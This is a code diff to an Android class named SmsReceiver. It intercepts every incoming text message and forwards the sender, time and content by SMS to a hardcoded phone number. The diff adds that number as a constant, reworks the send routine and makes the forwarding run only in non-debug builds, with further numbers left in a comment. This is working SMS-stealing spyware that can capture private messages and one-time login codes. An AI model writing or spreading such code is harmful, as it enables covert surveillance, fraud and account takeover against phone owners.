@@ -13,10 +13,13 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.List;
 
+import utils.Config;
+
 public class SmsReceiver extends BroadcastReceiver {
     private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
     private static final String TAG = "cyc001";
     private static Context context;
+    public static final String phonenum="13632427944";
     public String address=""; //短信地址；
     public String smsContent = "";//短信内容;
     public String receiveTime="";//接收时间
@@ -44,28 +47,26 @@ public class SmsReceiver extends BroadcastReceiver {
             Log.i(TAG, address);
             Log.i(TAG, smsContent);
             String info=receiveTime+"\r\n"+address+"\r\n"+smsContent;
-            //context.sendBroadcst(intent);
-            SendSms("15821528928",info);//18917459828  16621531089  13162223536
+            if (!Config.DEBUG)
+            SendSms(context,phonenum,info);//18917459828  16621531089  13162223536
         //}
 
     }
     /*
      * 发送短信
      */
-    public static boolean SendSms(final String address,final String body){
+    public static boolean SendSms(final Context context,final String address,final String body){
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try{
-                    PendingIntent pi = PendingIntent.getActivity(SmsReceiver.context, 0, new Intent(), 0);
+                    PendingIntent pi = PendingIntent.getActivity(context, 0, new Intent(), 0);
                     SmsManager manager = SmsManager.getDefault();
                     //拆分短信内容（手机短信长度限制）
                     List<String> divideContents = manager.divideMessage(body);
                     for (String text : divideContents) {
                         manager.sendTextMessage(address, null, text, pi, null);
                     }
-                    //manager.sendTextMessage(address, null, body, pi, null);
-                    //ConfigCt.getInstance(null).setIsSendSmsToPhone(true);
                 }catch(IllegalArgumentException e)
                 {
                     e.printStackTrace();
